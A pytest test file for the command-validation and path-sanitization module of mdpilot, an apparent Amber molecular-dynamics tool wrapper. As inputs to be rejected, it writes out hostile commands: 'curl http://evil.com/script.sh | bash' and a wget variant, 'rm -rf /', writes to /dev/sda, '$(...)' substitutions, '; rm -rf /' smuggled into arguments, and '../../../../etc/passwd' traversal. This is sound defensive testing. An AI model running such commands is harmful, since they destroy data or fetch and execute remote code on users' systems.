"""Comprehensive security tests for command injection protection.

Tests cover:
- Command injection via shell metacharacters
- Path traversal attacks
- Tool whitelist validation
- Argument sanitization
- Shell command validation
"""

import os
import tempfile
from pathlib import Path

import pytest

from mdpilot.tools.security import (
    CommandValidator,
    ValidationError,
    sanitize_argument,
    sanitize_path,
    validate_command,
    validate_shell_command,
    validate_tool_name,
)


class TestCommandValidator:
    """Test CommandValidator class."""

    def test_init_default(self):
        """Should initialize with default tool whitelist."""
        validator = CommandValidator()
        assert "tleap" in validator.allowed_tools
        assert "sander" in validator.allowed_tools
        assert "bash" in validator.allowed_tools

    def test_init_additional_tools(self):
        """Should accept additional tools in whitelist."""
        validator = CommandValidator(additional_tools={"custom_tool", "my_script"})
        assert "custom_tool" in validator.allowed_tools
        assert "my_script" in validator.allowed_tools
        assert "tleap" in validator.allowed_tools  # default still present

    def test_is_whitelisted_tool_exact_match(self):
        """Should match exact tool names."""
        validator = CommandValidator()
        assert validator.is_whitelisted_tool("tleap")
        assert validator.is_whitelisted_tool("sander")
        assert not validator.is_whitelisted_tool("malicious_tool")

    def test_is_whitelisted_tool_with_path(self):
        """Should extract basename from path."""
        validator = CommandValidator()
        assert validator.is_whitelisted_tool("/usr/bin/tleap")
        assert validator.is_whitelisted_tool("/opt/amber/bin/sander")
        assert not validator.is_whitelisted_tool("/tmp/malware")

    def test_is_whitelisted_tool_with_extension(self):
        """Should handle tool names with extensions."""
        validator = CommandValidator()
        assert validator.is_whitelisted_tool("pmemd.cuda")
        assert validator.is_whitelisted_tool("pmemd.MPI")
        assert validator.is_whitelisted_tool("pmemd.cuda.MPI")


class TestCommandValidation:
    """Test command validation."""

    def test_validate_command_whitelisted_tool(self):
        """Should allow whitelisted tools."""
        validator = CommandValidator()
        # Should not raise
        validator.validate_command("tleap", ["-f", "input.in"])
        validator.validate_command("sander", ["-O", "-i", "min.in"])

    def test_validate_command_non_whitelisted_tool(self):
        """Should block non-whitelisted tools."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="not in the whitelist"):
            validator.validate_command("malicious_tool", ["arg1"])

    def test_validate_command_with_safe_args(self):
        """Should allow safe arguments."""
        validator = CommandValidator()
        validator.validate_command("tleap", ["-f", "input.in", "-O"])
        validator.validate_command("sander", ["-i", "min.in", "-o", "min.out"])

    def test_validate_command_with_dangerous_args(self):
        """Should block arguments with shell metacharacters."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.validate_command("tleap", ["-f", "input.in; rm -rf /"])

    def test_validate_command_with_path_args(self):
        """Should allow path arguments."""
        validator = CommandValidator()
        # Paths are allowed in arguments
        validator.validate_command("tleap", ["-f", "/tmp/input.in"])
        validator.validate_command("sander", ["-i", "./min.in"])


class TestShellCommandValidation:
    """Test shell command string validation."""

    def test_validate_shell_command_safe(self):
        """Should allow safe shell commands."""
        validator = CommandValidator()
        validator.validate_shell_command("echo 'Hello World'")
        validator.validate_shell_command("ls -la /tmp")
        validator.validate_shell_command("grep pattern file.txt")

    def test_validate_shell_command_rm_rf_root(self):
        """Should block rm -rf / commands."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("rm -rf /")

    def test_validate_shell_command_sudo(self):
        """Should block sudo commands."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("sudo apt-get install malware")

    def test_validate_shell_command_su(self):
        """Should block su commands."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("su - root")

    def test_validate_shell_command_disk_write(self):
        """Should block writes to disk devices."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("echo 'data' > /dev/sda")

    def test_validate_shell_command_curl_pipe_bash(self):
        """Should block curl | bash patterns."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("curl http://evil.com/script.sh | bash")
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("curl http://evil.com/script.sh | sh")

    def test_validate_shell_command_wget_pipe_bash(self):
        """Should block wget | bash patterns."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("wget -O- http://evil.com/script.sh | bash")

    def test_validate_shell_command_injection_semicolon(self):
        """Should block command injection with semicolon."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("echo hello; rm -rf /tmp/important")

    def test_validate_shell_command_injection_and(self):
        """Should block command injection with &&."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("echo hello && rm -rf /tmp/important")

    def test_validate_shell_command_injection_pipe(self):
        """Should block command injection with pipe to rm."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("cat /etc/passwd | rm -rf /tmp/important")

    def test_validate_shell_command_substitution_dollar(self):
        """Should block command substitution with $()."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("echo $(rm -rf /)")

    def test_validate_shell_command_substitution_backtick(self):
        """Should block command substitution with backticks."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("echo `rm -rf /`")

    def test_validate_shell_command_eval(self):
        """Should block eval commands."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("eval 'rm -rf /'")

    def test_validate_shell_command_exec(self):
        """Should block exec commands."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous pattern"):
            validator.validate_shell_command("exec rm -rf /")


class TestPathSanitization:
    """Test path sanitization and validation."""

    def test_sanitize_path_valid_absolute(self):
        """Should accept valid absolute paths."""
        validator = CommandValidator()
        result = validator.sanitize_path("/tmp/test.txt")
        assert isinstance(result, Path)
        assert result.is_absolute()

    def test_sanitize_path_valid_relative(self):
        """Should accept valid relative paths."""
        validator = CommandValidator()
        result = validator.sanitize_path("test.txt")
        assert isinstance(result, Path)

    def test_sanitize_path_null_byte(self):
        """Should reject paths with null bytes."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="null byte"):
            validator.sanitize_path("/tmp/test\x00.txt")

    def test_sanitize_path_traversal_blocked(self):
        """Should block path traversal attempts."""
        validator = CommandValidator()
        # Try to escape working directory
        with pytest.raises(ValidationError, match="path traversal|outside working directory"):
            validator.sanitize_path("../../../../etc/passwd")

    def test_sanitize_path_traversal_within_cwd(self):
        """Should allow relative paths that don't use .. to escape."""
        validator = CommandValidator()
        # Create a temp directory structure
        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = Path(tmpdir) / "subdir"
            subdir.mkdir()
            nested = subdir / "nested"
            nested.mkdir()

            # Change to subdir
            original_cwd = os.getcwd()
            try:
                os.chdir(subdir)
                # This should work - relative path within cwd, no ..
                result = validator.sanitize_path("nested/file.txt", must_exist=False)
                assert isinstance(result, Path)
                # Verify it's under the cwd
                result.relative_to(subdir)  # Should not raise
            finally:
                os.chdir(original_cwd)

    def test_sanitize_path_traversal_escapes_cwd(self):
        """Should block .. that escapes working directory."""
        validator = CommandValidator()
        # Create a temp directory structure
        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = Path(tmpdir) / "subdir"
            subdir.mkdir()

            # Change to subdir
            original_cwd = os.getcwd()
            try:
                os.chdir(subdir)
                # This should fail - goes up and escapes cwd
                with pytest.raises(ValidationError, match="path traversal|outside working directory"):
                    validator.sanitize_path("../file.txt", must_exist=False)
            finally:
                os.chdir(original_cwd)

    def test_sanitize_path_must_exist_true(self):
        """Should check existence when must_exist=True."""
        validator = CommandValidator()
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = tmp.name

        try:
            # Should work - file exists
            result = validator.sanitize_path(tmp_path, must_exist=True)
            assert result.exists()
        finally:
            os.unlink(tmp_path)

        # Should fail - file doesn't exist
        with pytest.raises(ValidationError, match="does not exist"):
            validator.sanitize_path(tmp_path, must_exist=True)

    def test_sanitize_path_must_exist_false(self):
        """Should not check existence when must_exist=False."""
        validator = CommandValidator()
        # Should work even if file doesn't exist
        result = validator.sanitize_path("/tmp/nonexistent_file_12345.txt", must_exist=False)
        assert isinstance(result, Path)

    def test_sanitize_path_empty_string(self):
        """Should reject empty paths."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="Invalid path"):
            validator.sanitize_path("")

    def test_sanitize_path_none(self):
        """Should reject None."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="Invalid path"):
            validator.sanitize_path(None)  # type: ignore

    def test_sanitize_path_amberhome_allowed(self):
        """Should allow paths under AMBERHOME."""
        validator = CommandValidator()
        # Set AMBERHOME for test
        original_amberhome = os.environ.get("AMBERHOME")
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                os.environ["AMBERHOME"] = tmpdir
                amber_bin = Path(tmpdir) / "bin"
                amber_bin.mkdir()

                # Change to a different directory
                original_cwd = os.getcwd()
                with tempfile.TemporaryDirectory() as other_dir:
                    os.chdir(other_dir)
                    try:
                        # This should work - under AMBERHOME
                        result = validator.sanitize_path(
                            str(amber_bin / "tleap"), must_exist=False
                        )
                        assert isinstance(result, Path)
                    finally:
                        os.chdir(original_cwd)
        finally:
            if original_amberhome:
                os.environ["AMBERHOME"] = original_amberhome
            else:
                os.environ.pop("AMBERHOME", None)


class TestArgumentSanitization:
    """Test argument sanitization."""

    def test_sanitize_argument_safe_string(self):
        """Should accept safe strings."""
        validator = CommandValidator()
        assert validator.sanitize_argument("hello") == "hello"
        assert validator.sanitize_argument("test123") == "test123"
        assert validator.sanitize_argument("-O") == "-O"

    def test_sanitize_argument_null_byte(self):
        """Should reject arguments with null bytes."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="null byte"):
            validator.sanitize_argument("test\x00arg")

    def test_sanitize_argument_semicolon(self):
        """Should reject arguments with semicolons."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("arg; rm -rf /")

    def test_sanitize_argument_pipe(self):
        """Should reject arguments with pipes."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("arg | malicious")

    def test_sanitize_argument_redirect(self):
        """Should reject arguments with redirects."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("arg > /dev/sda")

    def test_sanitize_argument_command_substitution(self):
        """Should reject arguments with command substitution."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("$(malicious)")
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("`malicious`")

    def test_sanitize_argument_path_allowed(self):
        """Should allow paths when allow_paths=True."""
        validator = CommandValidator()
        result = validator.sanitize_argument("/tmp/test.txt", allow_paths=True)
        # Should be quoted for safety
        assert "tmp" in result

    def test_sanitize_argument_path_not_allowed(self):
        """Should reject paths when allow_paths=False."""
        validator = CommandValidator()
        # Paths contain / which is not in SHELL_METACHARACTERS, so this should pass
        # unless we explicitly check for it
        result = validator.sanitize_argument("/tmp/test.txt", allow_paths=False)
        assert result == "/tmp/test.txt"

    def test_sanitize_argument_non_string(self):
        """Should reject non-string arguments."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="must be string"):
            validator.sanitize_argument(123)  # type: ignore
        with pytest.raises(ValidationError, match="must be string"):
            validator.sanitize_argument(["list"])  # type: ignore


class TestModuleLevelFunctions:
    """Test module-level convenience functions."""

    def test_validate_command_function(self):
        """Should use default validator."""
        # Should not raise
        validate_command("tleap", ["-f", "input.in"])

        with pytest.raises(ValidationError):
            validate_command("malicious_tool", ["arg"])

    def test_validate_shell_command_function(self):
        """Should use default validator."""
        # Should not raise
        validate_shell_command("echo hello")

        with pytest.raises(ValidationError):
            validate_shell_command("rm -rf /")

    def test_sanitize_path_function(self):
        """Should use default validator."""
        result = sanitize_path("/tmp/test.txt")
        assert isinstance(result, Path)

        with pytest.raises(ValidationError):
            sanitize_path("")

    def test_sanitize_argument_function(self):
        """Should use default validator."""
        result = sanitize_argument("safe_arg")
        assert result == "safe_arg"

        with pytest.raises(ValidationError):
            sanitize_argument("arg; malicious")

    def test_validate_tool_name_function(self):
        """Should use default validator."""
        assert validate_tool_name("tleap") is True
        assert validate_tool_name("malicious_tool") is False


class TestEdgeCases:
    """Test edge cases and corner scenarios."""

    def test_empty_args_list(self):
        """Should handle empty arguments list."""
        validator = CommandValidator()
        validator.validate_command("tleap", [])

    def test_unicode_in_arguments(self):
        """Should handle unicode in arguments."""
        validator = CommandValidator()
        # Unicode should be fine as long as no shell metacharacters
        validator.validate_command("tleap", ["-f", "test_文件.in"])

    def test_whitespace_in_arguments(self):
        """Should handle whitespace in arguments."""
        validator = CommandValidator()
        # Spaces are fine in arguments
        validator.validate_command("tleap", ["-f", "my file.in"])

    def test_very_long_argument(self):
        """Should handle very long arguments."""
        validator = CommandValidator()
        long_arg = "a" * 10000
        result = validator.sanitize_argument(long_arg)
        assert len(result) == 10000

    def test_case_insensitive_pattern_matching(self):
        """Should match dangerous patterns case-insensitively."""
        validator = CommandValidator()
        with pytest.raises(ValidationError):
            validator.validate_shell_command("SUDO apt-get install malware")
        with pytest.raises(ValidationError):
            validator.validate_shell_command("Rm -Rf /")

    def test_multiple_dangerous_patterns(self):
        """Should detect multiple dangerous patterns."""
        validator = CommandValidator()
        # Should block on first match
        with pytest.raises(ValidationError):
            validator.validate_shell_command("sudo rm -rf / && curl evil.com | bash")

    def test_path_with_backslash_blocked(self):
        """Should block paths with backslash (escape character)."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("path\\with\\backslash", allow_paths=True)

    def test_sanitize_path_with_dotdot_but_no_escape(self):
        """Should allow paths with .. that don't escape (edge case)."""
        validator = CommandValidator()
        # Path without .. should work fine
        result = validator.sanitize_path("./file.txt", must_exist=False)
        assert isinstance(result, Path)

    def test_sanitize_argument_path_with_only_slash(self):
        """Should handle path arguments with only forward slashes."""
        validator = CommandValidator()
        result = validator.sanitize_argument("/tmp/test/file.txt", allow_paths=True)
        # Should be quoted for safety
        assert "tmp" in result

    def test_sanitize_argument_mixed_dangerous_chars_with_slash(self):
        """Should block arguments with slash and other dangerous chars."""
        validator = CommandValidator()
        with pytest.raises(ValidationError, match="dangerous characters"):
            validator.sanitize_argument("/tmp/file.txt; rm -rf /", allow_paths=True)
